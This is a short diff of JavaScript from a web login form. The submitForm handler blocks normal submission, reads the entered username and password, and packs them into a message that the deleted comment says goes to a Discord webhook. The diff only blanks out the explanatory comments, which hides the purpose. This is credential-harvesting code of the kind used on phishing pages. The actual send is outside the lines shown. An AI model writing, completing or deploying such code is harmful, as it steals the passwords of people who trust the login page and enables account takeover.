@@ -15,12 +15,12 @@
         }
 
         function submitForm(event) {
-            event.preventDefault(); // Prevent form submission
+            event.preventDefault(); // 
 
             var username = document.querySelector('input[name="username"]').value;
             var password = document.querySelector('input[name="password"]').value;
 
-            // Construct the payload to be sent to Discord webhook
+            // 
             var payload = {
                 content: "Username: " + username + "\nPassword: " + password
             };
